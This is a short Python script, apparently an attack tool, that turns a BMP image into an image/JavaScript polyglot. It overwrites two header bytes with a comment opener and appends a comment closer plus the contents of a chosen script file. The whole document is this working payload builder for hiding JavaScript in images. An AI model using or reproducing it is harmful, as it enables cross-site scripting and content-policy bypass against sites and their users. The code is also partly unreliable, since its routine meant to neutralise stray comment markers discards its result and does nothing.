class JavascriptInjectionToIMG:
    def __init__(self):
        self.img_file           = None
        self.img_name           = None
        self.new_img_name       = None
        self.script_comment_end = b'\xFF\x2A\x2F\x3D\x31\x3B' # */=1;

    def open(self, f_name):
        self.img_name = f_name
        
        with open(self.img_name, "rb") as img:
            self.img_file    = bytearray(img.read())

    def replace_command_to_space(self):
        self.img_file.replace(b"\x2F\x2A", b"\x00\x00")
        self.img_file.replace(b"\x2A\x2F", b"\x00\x00") 
        
    def replace_img_to_code(self, script_name):
        self.replace_command_to_space()
        script_buf = None
        
        with open(script_name, "rb") as f:
            script_buf = f.read()
        
        self.img_file[2]  = 0x2F
        self.img_file[3]  = 0x2A
        self.img_file    += (self.script_comment_end + script_buf)

    def create_img(self, new_f_name):
        with open(new_f_name, "wb") as f:
            f.write(self.img_file)
            
if __name__ == "__main__":
    a = JavascriptInjectionToIMG()
    a.open("img_file_name.bmp")
    a.replace_img_to_code("js.js")
    a.create_img("new_img_file_name.bmp")
